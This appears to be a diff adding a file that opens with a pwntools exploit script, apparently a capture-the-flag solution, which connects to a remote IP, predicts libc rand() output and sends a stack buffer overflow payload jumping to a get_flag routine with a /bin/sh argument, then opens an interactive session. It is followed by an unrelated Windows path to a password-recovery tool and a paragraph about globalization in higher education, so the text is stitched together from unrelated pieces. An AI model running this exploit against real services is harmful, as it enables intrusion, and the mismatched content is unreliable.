@@ -1,0 +1,20 @@
+from pwn import*
+from ctypes import*
+
+io =remote("123.57.230.48",12345)
+get_flag =0x080485E7
+bin_sh =0x080486D0
+
+libc =cdll.LoadLibrary('libc.so.6')
+
+libc.srand()
+io.recvuntil("Try your best to solve it!\n")
+io.sendline(str(libc.rand()))
+payload=b'a'*(0x1a+0x4)+p32(get_flag)+p32(bin_sh)
+io.sendline(payload)
+io.interactive()
+
+
+C:\Program Files (x86)\Elcomsoft Password Recovery\
+The effect of globalization on higher education is extremely complex. For higher education, globalization means to determine the social power, the economic power and the technological power of the 21st century including advanced technology, the new mind of raising money for higher education and the unprecedented teacher - student mobility. The particular concern is that the method of the popularity of higher education brings unprecedented expansion of higher education everywhere. Now there are almost 134 million students accepting higher education. These are the trend of globalization mostly unavoidable.
+
